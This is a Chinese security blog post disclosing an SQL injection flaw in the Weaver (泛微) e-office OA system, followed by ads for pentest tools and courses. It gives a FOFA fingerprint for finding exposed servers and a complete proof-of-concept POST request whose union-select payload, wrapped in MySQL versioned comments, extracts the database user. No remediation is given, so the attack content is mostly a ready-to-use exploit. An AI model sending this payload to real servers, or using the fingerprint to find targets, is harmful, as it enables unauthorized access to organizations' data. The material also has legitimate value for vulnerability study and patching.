# 原创
：  SQL注入漏洞

# SQL注入漏洞

> 
如果文章对你有帮助，欢迎关注、点赞、收藏一键三连支持以下哦！<br/> 想要一起交流学习的小伙伴可以加zkaq222（备注CSDN，不备注通不过哦）进入学习，共同学习进步


**0x01 漏洞介绍**<br/> 泛微e-office系统是标准、易用、快速部署上线的专业协同OA软件，国内协同OA办公领域领导品牌，致力于为企业用户提供专业OA办公系统、移动OA应用等协同OA整体解决方案。泛微e-office深谙改革之道以迎变革之机，沉心产品研发数十载之久，全新产品e-office10.0正式上线，力求为用户提供更极致、更优质的产品体验。 一年半多的孵化造就了产品功能的进一步提升。该漏洞存在与lnit.php?m= 处，攻击者可以利用该漏洞获取数据库敏感信息<br/>**0x02 影响产品**

```
 泛微协同办公e-office标准版

```

**0x03 语法特征**

```
app="泛微-EOffice"

```

**0x04 漏洞复现**<br/> 页面<br/>  

<br/> POC

```
POST /E-mobile/App/Init.php?m=getSelectList_Crm HTTP/1.1
Host: xxxx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 60

cc_parent_id=-999 /*!50000union*/ /*!50000select*/ 1,user()#

```

**没看够~？欢迎关注！**

 渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/f333a24647774be5b99b00fb7019d620.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/3e579b7d7a164889a57771c035775069.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/a601ca2e0eb040bd911477a4f54fef8e.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/04beeeb6757b422a83ca0900a349a544.png" width="665"/>
